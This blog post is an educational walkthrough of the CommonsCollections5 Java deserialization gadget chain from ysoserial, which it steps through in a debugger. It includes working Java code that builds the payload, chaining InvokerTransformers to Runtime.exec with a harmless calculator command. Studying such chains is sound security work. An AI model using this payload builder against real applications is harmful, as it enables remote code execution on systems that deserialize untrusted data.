---
layout: post
title:  "Analyze Java deserialization: CommonsCollections5 gadget chain ( part 1 )"
date:   2022-01-19 16:00:00 +0700
categories: research
author: Quang Vo
tags: java, deserialization
description: Research
---

# Introduction 
Most of people have heard about Java deserialization apocalypse. There are great tools out there for hunting deserialization vulnerabilities out there, to name a fews:
- The famous [ysoserial](https://github.com/frohoff/ysoserial)
- The same [ysoserial](https://github.com/pwntester/ysoserial.net) but for C# .NET
- [Gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)

While in those tools, payloads are already there for us to use. But I believe the best way to learn and remember what we learnt are by actually understanding it, that's why I write this blog, to help me remember and understand it more and also for who want to know about this. t

In this blog, we are going to dive in some of the famous gadget chain to see what's in there and how it's work.

IDE I use in this blog will be [IntelliJ IDEA Ultimate](https://www.jetbrains.com/idea/) so that we can debug line by line of codes, you can use the community version, it's fine.

I'm not an expert in Java or Java deserialization exploit, so if I made any mistakes in this blog post, please forgive me and let me know how can I fix it.

## CommonsCollections5 gadget chain

In ysoserial, there are 7 different gadget chains relate to `CommonsCollection` . In this blog post, I'll use `commons-collection version 3.2.1` .

Here is what the gadget chain look like from `ysoserial` : 

```java
BadAttributeValueExpException.readObject()
  TiedMapEntry.toString()
    TiedMapEntry.getValue()
      LazyMap.get()
        ChainedTransformer.transform()
          ConstantTransformer.transform()
          InvokerTransformer.transform()
            Method.invoke()
              Class.getMethod()
          InvokerTransformer.transform()
            Method.invoke()
              Runtime.getRuntime()
          InvokerTransformer.transform()
            Method.invoke()
```

I write some Java code to invoke the gadget chain and start to debug it ( you can see more details from [here](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java)):
```java
   public static void CommonsCollections5() throws IllegalAccessException, NoSuchFieldException {

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"gnome-calculator"})});
        HashMap innerMap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innerMap,chain);
        TiedMapEntry tiedMap = new TiedMapEntry(map,123);
        tiedMap.toString();

        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);

        Field fi = poc.getClass().getDeclaredField("val");
        fi.setAccessible(true);
        fi.set(poc, tiedMap);
    }
```

The gadget chain start at `BadAttributeValueExpException.readObject()`

Content of `BadAttributeValueExpException.readObject()`

![image](https://user-images.githubusercontent.com/37280106/150266360-12b657d4-9f5a-45ee-aa0f-dccd4bd4a735.png)

We will place breakpoint at `LazyMap.get()` method to start debugging this gadget chain

![image](https://user-images.githubusercontent.com/37280106/150266663-855ce765-8fcb-488e-88d8-e71c93f271bf.png)

Why do I place breakpoint at `LazyMap.get()` method ?. 

That is because if we place breakpoint at `BadAttributeValueExpException.readObject()` or `TiedMapEntry.toString()` or `TiedMapEntry.getValue()` method.
IntelliJ IDEA Debugger will execute the payload and pop calc before we go all the way down to the gadget chain, I guess during the Debugger session, IntelliJ IDEA has invoked methods beforehand to get us the local variables's value, so the payload has been executed.


Let's go through what `LazyMap.get()` does:
- First, it checks if `this.map` has a key or not
- If not, it will call method `this.factory.transform()`

![image](https://user-images.githubusercontent.com/37280106/150267702-fc9a2313-8360-4e8a-8720-cf7cebbec500.png)

`this.factory` here is `ChainedTransfomer` so `this.factory.transform()` is `ChainedTransformer.transform` 

Stepping into `this.factory.transform()`
![image](https://user-images.githubusercontent.com/37280106/150271971-8917f61a-4674-4015-bfc3-6e033447f2cb.png)



`this.iTransformer[]` has 4 elements:
- ConstantTransformer
- InvokerTransformer
- InvokerTransformer
- InvokerTransformer

### At the first interval, `i=0` 

`this.iTransformer[0] = ConstantTransformer` 

So `this.iTransformer[0].transform() = ConstantTransformer.transform()`


![image](https://user-images.githubusercontent.com/37280106/150269639-b80b205d-e819-402b-89a4-1b56d8c3222e.png)
*ConstantTransformer.transform()*

`ConstantTransformer.transform()` doesn't do anything much, just return `this.iConstant` 

### Second interval, `i=1`

![image](https://user-images.githubusercontent.com/37280106/150272216-e36be323-b30c-4c2d-8fe1-52203a75154a.png)

`this.iTransformer[1].transform(object)` where:
- `this.iTransformer[1] = InvokerTransformer`
- `Object = class java.lang.Runtime` 

Stepping in `InvokerTransformer.transform(object)` 

![image](https://user-images.githubusercontent.com/37280106/150272502-2170d79d-a22f-43d9-89a0-09e094a6a975.png)

Current local variables:
- `Object input = class java.lang.Runtime` 
- `Class cls = Runtime.class.getClass()` => `cls = java.lang.Class` 
- `this.iMethodName = getMethod` 
- `this.iParamTypes has been set before: String.class, Class[].class`
- `this.iArgs = new Object[2] {"getRuntime", Class[0]}` 
- 
And then it executes `method.invoke` 

The input here is: `Runtime.class`, an **Object** of class `java.lang.Class`. Every class in Java is an object of class `java.lang.Class` 

So `Class cls = Runtime.class.getClass() => cls = java.lang.Class` 

The next line: `Method method = cls.getMethod(this.iMethodName, this.iParamTypes)` with:
- `this.iMethodName = "getMethod"`

It turns to:
```java
Method method = Class.getMethod("getMethod"); 
```
Which means, using `getMethod()` to get the method name `getMethod` of class `Class` ( kinda confusing right ? )

The final one: `method.invoke(input, this.iArgs)`

This is belong to **Java Reflection API** collection, it allows us to invoke methods on a class, if that class **is not possible to cast an instance of the class to the desire type** ( read more [here](https://docs.oracle.com/javase/tutorial/reflect/member/methodInvocation.html))

- `input = java.lang.Runtime`
- `this.iArgs = new Object[2] {"getRuntime", Class[0]}`

Eventually, it will turns into:
```java
Runtime.class.getMethod("getRuntime", ...)
```

The final result of this loop is `object = getRuntime()` 

### Third interval, `i=2`

![image](https://user-images.githubusercontent.com/37280106/150292581-59436f73-e945-424b-8a88-29ccd2b77b69.png)

Where:
- `object: java.lang.Runtime` 
- `this.iTransfomer[2].transform()` is `InvokerTransformer.transform(object)` 

Stepping into `InvokerTransformer.transform(object` ( it will be like Step 2 )
![image](https://user-images.githubusercontent.com/37280106/150295683-3073196e-6ef1-4ccf-bfac-b3c53c4c497e.png)

Current local variables:
- `input: Runtime.getRuntime()`
- `cls: class java.lang.reflect.Method` ( this was because getRuntime() method was invoke by reflection Invoke before ) 

```java
Method method =   cls.getMethod(this.iMethodName, this.iParamTypes);  
```
 with:
```
 this.iMethodName = "invoke"
 this.iParamTypes[] = {java.lang.Object, Object[]}
 
 => java.lang.reflect.Method.invoke()
```

Finally
```
return method.invoke(input, this.iArgs)
```

will become:
```
java.lang.reflect.Method.invoke(Runtime.getRuntime(), ....)
```

### The final interval, `i=3`

![image](https://user-images.githubusercontent.com/37280106/150307113-4046c7e4-00ef-45bc-8c49-703eeadcd6e6.png)

Stepping into the `transform` method

![image](https://user-images.githubusercontent.com/37280106/150307228-cac7913b-54bd-49cf-8048-461f3a205719.png)

This time:
- `input: Runtime object` ( input is an **Object**, not class like the previous loops ) 
- `Class cls = input.getClass() => cls = class java.lang.Runtime`

```
method = Runtime.class.getMethod("exec", "gnome-calculator")
```

Finally

```
method.invoke() => our sink
```

Will execute our command, this is the last of our chain

![image](https://user-images.githubusercontent.com/37280106/150308012-e453215a-167b-4f71-9fa4-42dee1aeb6a0.png)

## Conclusion

I'm writing this post without having much experience about Java or Java deserialization, but I think research & write down what you understand is a crucial part of being a security researcher, even if you may be wrong ;)
